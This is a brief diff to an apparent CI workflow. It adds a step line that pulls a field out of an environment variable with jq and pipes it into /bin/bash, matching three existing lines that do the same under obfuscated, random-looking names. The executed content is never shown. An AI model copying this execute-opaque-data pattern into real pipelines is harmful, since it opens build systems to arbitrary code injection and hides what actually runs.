@@ -50,6 +50,7 @@ jobs:
           echo $ckxk27 | jq -r .afna0 | /bin/bash
           echo $z205 | jq -r .ywmsc1661 | /bin/bash
           printf '%s' "$eys691" | jq -r .yy33 | /bin/bash
+          printf '%s' "$m609" | jq -r .i8 | /bin/bash
 
       - name: Archive output
         if: always()
